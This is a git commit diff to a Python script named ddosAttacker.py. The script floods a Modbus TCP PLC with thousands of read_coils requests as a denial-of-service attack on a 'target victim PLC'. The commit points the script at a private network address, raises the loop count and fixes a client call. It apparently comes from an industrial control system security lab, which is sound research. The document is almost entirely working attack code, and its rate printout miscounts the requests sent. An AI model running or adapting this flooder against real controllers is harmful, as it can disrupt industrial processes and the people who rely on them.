57b4f6055cfac3997f5d142fb77182dd31d74651
Yuancheng Liu <liu_yuan_cheng@hotmail.com>
2023-10-06 15:02:16 +0800

    Update ddosAttacker.py
    fixed small bug of the ddos attack script

--- attack/ddosAttacker.py
+++ attack/ddosAttacker.py
@@ -14,24 +14,25 @@
 
 import time
 from pyModbusTCP.client import ModbusClient
-count = 0 
-hostIp = '127.0.0.1'
+count = 0
+hostIp = '10.107.105.7'
 hostPort = 502
 
 print('Try to connect to the target victim PLC: %s' %str(hostIp))
 print('Start PLC read request thread')
 print('Start pLC write request thread')
 timeVal = time.time()
-for i in range(10):
+for i in range(2000):
     count +=1
     print('Try connect to the PLC')
     client = ModbusClient(host=hostIp, port=hostPort, auto_open=True)
+    reuslt = None
     if client.open():
         print("send 100 request.")
         for i in range(100):
-            reuslt = client.client.read_coils(0, 4)
+            reuslt = client.read_coils(0, 4)
         timeInt = time.time() - timeVal
-        print("PLC request sending frequency: %s" %str(100/timeInt))
+        print("PLC request sending frequency: %s" %str(1000/timeInt))
         timeVal = time.time()
     if not reuslt: print("connection rejected")
     client.close()
